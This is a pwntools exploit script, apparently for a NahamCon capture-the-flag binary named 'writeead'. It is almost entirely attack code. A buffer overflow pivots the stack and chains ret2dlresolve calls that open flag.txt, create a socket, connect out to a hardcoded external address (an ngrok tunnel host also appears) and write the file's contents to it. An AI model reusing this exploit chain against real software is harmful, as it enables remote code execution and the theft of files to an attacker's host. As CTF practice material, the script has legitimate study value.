from pwn import *
from sys import *

elf = ELF('writeead')

p = process('./writeead')
HOST = 'challenge.nahamcon.com'
PORT = 31481

cmd = """
b*open
b*socket
b*connect
b*write
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

leave_ret = 0x08049156

"""
open("./flag.txt", 0); // O_RDONLY
socket(2, 1, 0); // AF_INET, SOCK_STREAM, 0
connect(socket_fd, socket_struct, 0x10)
read(flag_fd, buf, 0x80):
write(socket_fd, buf, 0x80):
"""
buf = elf.bss()+0x400

context.binary = elf = ELF('writeead')
rop = ROP(context.binary)
opens = Ret2dlresolvePayload(elf, "open", ["flag.txt",0])
socket = Ret2dlresolvePayload(elf, "socket", [2,1,0])
conn = Ret2dlresolvePayload(elf, "connect", [2,b'\x02\x00:\xb2\x03\x84\x9f\x9e',0x10])
read = Ret2dlresolvePayload(elf, "read", [1,buf,0x80])
write = Ret2dlresolvePayload(elf, "write", [2,buf,0x80])

print(shellcraft.i386.linux.connect(b'6.tcp.ngrok.io', 15026))

rop.read(0, opens.data_addr)
rop.ret2dlresolve(opens)
rop.read(0, socket.data_addr)
rop.ret2dlresolve(socket)
rop.read(0, conn.data_addr)
rop.ret2dlresolve(conn)
rop.read(0, read.data_addr)
rop.ret2dlresolve(read)
rop.read(0, write.data_addr)
rop.ret2dlresolve(write)
raw_rop = rop.chain()

print(hex(elf.bss()))

payload = b"A" * (0x3ef)
payload += p32(elf.bss()+0x300)
payload += p32(elf.plt.read)
payload += p32(leave_ret) # leave; ret
payload += p32(0)
payload += p32(elf.bss()+0x304)
payload += p32(0x400)
payload = payload.ljust(0x44c,b"\x00")
p.send(payload)
p.send(rop.chain().ljust(0x400,b'\x00'))
p.send(opens.payload)
sleep(0.5)
p.send(socket.payload)
sleep(0.5)
p.send(conn.payload)
sleep(1)
p.send(read.payload)
sleep(1)
#gdb.attach(p,cmd)
p.send(write.payload)
p.interactive()

